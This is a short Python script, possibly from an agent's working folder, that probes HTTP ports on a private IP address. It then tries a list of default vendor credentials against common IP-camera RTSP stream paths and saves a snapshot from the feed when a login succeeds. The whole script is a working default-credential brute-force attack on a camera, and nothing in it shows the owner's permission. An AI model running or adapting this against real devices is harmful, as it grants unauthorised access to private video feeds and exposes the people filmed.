import urllib.request
import re
import cv2

# Probe HTTP on 10.245.106.240:80 and 8000
for p in [80, 8000]:
    url = f"http://10.245.106.240:{p}/"
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=2) as resp:
            data = resp.read()
            print(f"HTTP {url} -> Status {resp.status}, Length {len(data)}")
            print("Headers:", resp.headers)
            print("Snippet:", data[:500])
    except Exception as e:
        print(f"HTTP {url} -> {e}")

# Test RTSP with common credentials
common_creds = [
    ("", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "admin12345"),
    ("admin", "password"),
    ("admin", "12345678"),
    ("admin", "admin@123"),
    ("admin", "Admin123"),
    ("root", "root"),
    ("root", "pass"),
    ("user", "user")
]

paths = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/h264Preview_01_main",
    "/h264Preview_01_sub",
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    "/live/ch0",
    "/stream1",
    "/stream2",
    "/11",
    "/12",
    "/onvif1"
]

print("\n--- Testing RTSP Authentication on 10.245.106.240:554 ---")
for user, pwd in common_creds:
    auth = f"{user}:{pwd}@" if user or pwd else ""
    for path in paths:
        rtsp_url = f"rtsp://{auth}10.245.106.240:554{path}"
        try:
            cap = cv2.VideoCapture(rtsp_url, cv2.CAP_FFMPEG)
            cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 1500)
            cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 1500)
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    print(f"\n[SUCCESSFUL RTSP CONNECTION!]")
                    print(f"URL: {rtsp_url}")
                    print(f"Resolution: {frame.shape[1]}x{frame.shape[0]}")
                    cv2.imwrite("scratch/camera_test_snapshot.jpg", frame)
                    break
        except Exception as e:
            pass
